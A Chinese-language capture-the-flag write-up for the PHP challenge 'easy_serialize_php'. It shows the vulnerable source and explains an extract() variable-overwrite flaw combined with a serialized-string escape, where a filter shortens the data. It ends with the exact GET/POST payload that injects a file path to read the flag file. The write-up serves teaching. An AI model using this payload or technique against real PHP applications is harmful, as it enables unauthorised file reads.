PHP变量覆盖, 反序列化字符串逃逸

题目地址：easy_serialize_php

题目信息

进入之后，点击source_code，出现如下源码： 

<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

经过提示，先?f=phpinfo查看一下有什么信息

想必这个文件肯定与flag有关。

解题

从代码来看，我们应该需要通过echo file_get_contents(base64_decode($userinfo['img']));读取flag，那么f的值就是show_image。

现在就是如何让_SESSION['img']=flag文件。如果传入img_path参数，那么就会经过sha1()，即使我们输入的是flag文件名，也会变成hash值从而无法读取。所以我们不能传入img_path。那么此时的_SESSION['img']=guest_img.png。

那需要怎么做才能将值变成我们想要的值呢？这里就涉及到了反序列化字符串逃逸。

先介绍以下extract()函数，这个函数会导致变量覆盖漏洞，这也是本题的考点之一。正常情况下： 

$_SESSION['user']='guest';
$_SESSION['function']='show_image';

但是如果我们通过该函数，POST方式传入如下信息： 

_SESSION[user]=flag&_SESSION[function]=flag

那么此时变量就会被覆盖： 

$_SESSION['user']='flag';
$_SESSION['function']='flag';

反序列化字符串逃逸

其实有两种情况，本题涉及到的是字符串变少的情况。

正常情况下情况： 

<?php
$_SESSION['user']='guest';
$_SESSION['function']='show_image';
$_SESSION['img'] = 'guest_img.png';
echo serialize($_SESSION);
?>

结果：
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";}

上面的字符串也能够通过反序列化转为数组：

设想如下的字符串能否通过反序列化转为数组？如果可以，数组的值为什么？ 

a:3:{s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";}

结果如下：

虽然字符串中s:4:"user";s:33:"";33后面的双引号中应该存在33个字符，才满足序列化的规律。查看结果发现，function这个键不见了，而多了一个hdf的键。

解释： 

a:3:{s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";}

从33后的第一个双引号之后取33个字符：";s:8:"function";s:10:"show_image，这33个字符正好被一对双引号包括，因此，系统会认为这就是user的值。然后后面的s:3:"img";s:13:"guest_img.png";正好也满足序列h规律，因为这个数组有3个值，所以s:3:"hdf";s:3:"zzf";也成为了数组的键值。

所以这个字符串还是满足序列化的特征的，只不过利用某种办法让原来的user的33个字符消失了，从而将后面的字符串（我们注入的字符串）当作原来数组中的数据。从而实现了逃逸。

需要注意的是 

a:3:{s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";}1341414141412412412

也能够成功。因为反序列化时只要a:3:{s:4:"user";s:33:"";s:8:"function";s:10:"show_image";s:3:"img";s:13:"guest_img.png";s:3:"hdf";s:3:"zzf";}满足规律，并且已经能够返回数组了，那么后面的字符串就会被丢弃。

本题利用

先直接给出payload： 

GET: f=show_image

POST: _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}

上述的内容通过序列化得到： 

a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:13:"guest_img.png";}

但是，flag会被过滤，导致变成如下： 

a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:13:"guest_img.png";}

而user的值的24个字符往后找，正好是";s:8:"function";s:59:"a。从而将上面的字符串分为几大部分： 

a:3:{
s:4:"user";s:24:"";s:8:"function";s:59:"a";
s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";
s:2:"dd";s:1:"a";}
";s:3:"img";s:13:"guest_img.png";}

前四行正好能够满足序列化后的字符串的规律，因此对上述字符串反序列得到的数组如下：

成功将我们想要读取的文件名注入。最后的那个只是因为数组需要三个键值对从而凑得。

其实d0g3_f1ag.php读取到的是flag文件名是什么。

将flag文件名base64编码后替代原来文件名的位置（注意长度是否有变化）即可（注意那个斜杠也是文件名的一部分！）
